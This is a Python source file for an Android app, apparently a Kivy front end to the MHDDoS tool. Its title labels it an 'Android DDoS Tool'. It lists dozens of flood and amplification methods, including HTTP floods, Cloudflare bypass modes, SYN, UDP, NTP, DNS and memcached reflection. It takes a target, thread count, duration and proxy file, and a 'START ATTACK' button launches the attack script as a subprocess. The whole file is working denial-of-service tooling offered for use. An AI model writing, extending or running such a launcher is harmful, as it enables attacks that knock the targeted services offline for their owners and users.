#!/usr/bin/env python3
import sys
import os
from pathlib import Path

_root = Path(__file__).resolve().parent
_libs = str(_root / 'libs')
if _libs not in sys.path:
    sys.path.insert(0, _libs)

import subprocess
import threading

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.spinner import Spinner
from kivy.clock import mainthread
from kivy.core.window import Window
from kivy.utils import platform


LAYER7 = {
    "GET", "POST", "CFB", "CFBUAM", "BYPASS", "DGB", "STRESS", "DYN",
    "SLOW", "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "AVB",
    "BOT", "APACHE", "XMLRPC", "OVH", "RHEX", "STOMP", "BOMB", "KILLER",
    "DOWNLOADER", "TOR"
}


class MHDDoSApp(App):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.process = None
        self.running = False

    def build(self):
        Window.size = (420, 720)
        root = BoxLayout(orientation='vertical', spacing=5, padding=10)

        title = Label(
            text='[b]MHDDoS[/b] - Android DDoS Tool',
            markup=True,
            size_hint_y=0.06,
            color=(0, 1, 0.8, 1)
        )
        root.add_widget(title)

        # Method
        mrow = BoxLayout(size_hint_y=0.07)
        mrow.add_widget(Label(text='Method:', size_hint_x=0.3))
        self.method_spinner = Spinner(
            text='GET',
            values=(
                'GET', 'POST', 'CFB', 'CFBUAM', 'BYPASS', 'DGB', 'STRESS',
                'DYN', 'SLOW', 'HEAD', 'NULL', 'COOKIE', 'PPS', 'EVEN',
                'GSB', 'AVB', 'BOT', 'APACHE', 'XMLRPC', 'OVH', 'RHEX',
                'STOMP', 'BOMB', 'KILLER', 'DOWNLOADER', 'TOR',
                'UDP', 'TCP', 'SYN', 'ICMP', 'VSE', 'MINECRAFT', 'MCBOT',
                'CPS', 'CONNECTION', 'FIVEM', 'FIVEM-TOKEN', 'TS3', 'MCPE',
                'OVH-UDP', 'NTP', 'DNS', 'MEM', 'CLDAP', 'CHAR', 'ARD', 'RDP'
            ),
            size_hint_x=0.7
        )
        mrow.add_widget(self.method_spinner)
        root.add_widget(mrow)

        # Target
        trow = BoxLayout(size_hint_y=0.07)
        trow.add_widget(Label(text='Target:', size_hint_x=0.3))
        self.target_input = TextInput(
            text='', multiline=False,
            hint_text='example.com or 1.2.3.4:80'
        )
        trow.add_widget(self.target_input)
        root.add_widget(trow)

        # Params grid
        grid = GridLayout(cols=2, size_hint_y=0.35, spacing=5)

        grid.add_widget(Label(text='Threads (1-1000):'))
        self.threads_input = TextInput(text='100', multiline=False)
        grid.add_widget(self.threads_input)

        grid.add_widget(Label(text='Duration (sec):'))
        self.duration_input = TextInput(text='60', multiline=False)
        grid.add_widget(self.duration_input)

        grid.add_widget(Label(text='Proxy Type (0-6):'))
        self.proxy_type_input = TextInput(
            text='0', multiline=False,
            hint_text='0=All 1=HTTP 4=S4 5=S5 6=Random'
        )
        grid.add_widget(self.proxy_type_input)

        grid.add_widget(Label(text='Proxy File:'))
        self.proxy_file_input = TextInput(
            text='0', multiline=False,
            hint_text='filename or 0 for none'
        )
        grid.add_widget(self.proxy_file_input)

        grid.add_widget(Label(text='RPC (L7 only):'))
        self.rpc_input = TextInput(text='0', multiline=False)
        grid.add_widget(self.rpc_input)

        root.add_widget(grid)

        # Buttons
        btn_row = BoxLayout(size_hint_y=0.1, spacing=10)
        self.start_btn = Button(
            text='START ATTACK',
            background_color=(0, 0.7, 0, 1),
            background_normal='',
            bold=True
        )
        self.start_btn.bind(on_press=self.start_attack)
        btn_row.add_widget(self.start_btn)

        self.stop_btn = Button(
            text='STOP',
            background_color=(0.7, 0, 0, 1),
            background_normal='',
            disabled=True,
            bold=True
        )
        self.stop_btn.bind(on_press=self.stop_attack)
        btn_row.add_widget(self.stop_btn)
        root.add_widget(btn_row)

        # Log
        root.add_widget(Label(text='[Output Log]', size_hint_y=0.03))
        sv = ScrollView(size_hint_y=0.3)
        self.log_input = TextInput(
            text='', readonly=True, size_hint_y=None,
            background_color=(0.05, 0.05, 0.05, 1),
            foreground_color=(0, 1, 0, 1)
        )
        self.log_input.bind(minimum_height=self.log_input.setter('height'))
        sv.add_widget(self.log_input)
        root.add_widget(sv)

        return root

    def log(self, msg):
        self.log_input.text += msg + '\n'
        lines = self.log_input.text.split('\n')
        if len(lines) > 200:
            self.log_input.text = '\n'.join(lines[-200:])

    @mainthread
    def update_log(self, text):
        self.log(text)

    @mainthread
    def set_buttons(self, running: bool):
        self.start_btn.disabled = running
        self.stop_btn.disabled = not running
        self.running = running
        if not running:
            self.process = None

    def _python_exe(self):
        exe = sys.executable
        if platform == 'android':
            alt = '/data/data/org.mhddos/files/python/bin/python'
            alt2 = '/data/data/org.mhddos/files/python/bin/python3'
            if not os.path.exists(exe):
                for p in (alt, alt2):
                    if os.path.exists(p):
                        return p
        return exe

    def build_args(self):
        method = self.method_spinner.text.upper()
        target = self.target_input.text.strip()
        threads = self.threads_input.text.strip() or '100'
        duration = self.duration_input.text.strip() or '60'

        if not target:
            self.update_log('[ERROR] Target is required')
            return None

        script = str(_root / 'start.py')
        args = [self._python_exe(), '-u', script, method]

        if method in LAYER7:
            if '://' not in target:
                target = 'http://' + target
            pt = self.proxy_type_input.text.strip() or '0'
            pf = self.proxy_file_input.text.strip() or '0'
            rpc = self.rpc_input.text.strip() or '0'
            args += [target, pt, threads, pf, rpc, duration]
        else:
            if ':' not in target:
                target += ':80'
            args += [target, threads, duration]
            pt = self.proxy_type_input.text.strip()
            pf = self.proxy_file_input.text.strip()
            if pt and pf and pt != '0':
                args += [pt, pf]

        return args

    def start_attack(self, _btn):
        if self.running:
            return

        args = self.build_args()
        if not args:
            return

        self.update_log(f'[+] Starting: {args[2]} {args[3]}')
        self.update_log(f'[+] Full: {" ".join(args[2:])}')
        self.set_buttons(True)

        env = os.environ.copy()
        env['PYTHONPATH'] = _libs + os.pathsep + env.get('PYTHONPATH', '')

        startupinfo = None
        if hasattr(subprocess, 'STARTUPINFO'):
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        self.process = subprocess.Popen(
            args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1, env=env, startupinfo=startupinfo
        )
        threading.Thread(target=self._reader, daemon=True).start()

    def _reader(self):
        try:
            for line in iter(self.process.stdout.readline, ''):
                if not self.running:
                    break
                if line:
                    self.update_log(line.rstrip())
            self.process.stdout.close()
        except Exception:
            pass
        finally:
            if self.running:
                self.attack_done()

    @mainthread
    def attack_done(self):
        self.update_log('[+] Attack completed / stopped.')
        self.set_buttons(False)

    def stop_attack(self, _btn):
        if self.process:
            self.update_log('[!] Stopping...')
            try:
                self.process.terminate()
            except Exception:
                try:
                    self.process.kill()
                except Exception:
                    pass
        self.attack_done()

    def on_stop(self):
        self.stop_attack(None)


if __name__ == '__main__':
    MHDDoSApp().run()
